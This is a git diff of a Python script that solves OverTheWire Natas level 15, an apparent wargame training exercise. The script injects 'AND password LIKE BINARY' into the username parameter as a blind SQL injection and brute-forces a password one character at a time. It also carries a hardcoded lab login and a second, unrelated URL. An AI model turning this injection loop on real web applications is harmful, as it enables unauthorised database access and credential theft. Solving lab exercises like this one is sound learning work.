@@ -1,11 +1,9 @@
-from bs4 import BeautifulSoup
 import requests
 import concurrent.futures
 import string
 
 def req(x):
     res = requests.get(url=url,auth=lvl_pass, params={'username':un_base+x, 'debug':'true'})
-    # serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
     if "This user exists." in res.text:
         return x
     else:
@@ -48,7 +46,8 @@ def main():
 
 
 
-url = 'http://natas15.natas.labs.overthewire.org' #'http://maxjytyla.com/index.php'
+url = 'http://natas15.natas.labs.overthewire.org' 
+url2 = 'http://maxjytyla.com/index.php'
 lvl_pass = requests.auth.HTTPBasicAuth('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
 un_base = 'natas16" AND password LIKE BINARY "'
 alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
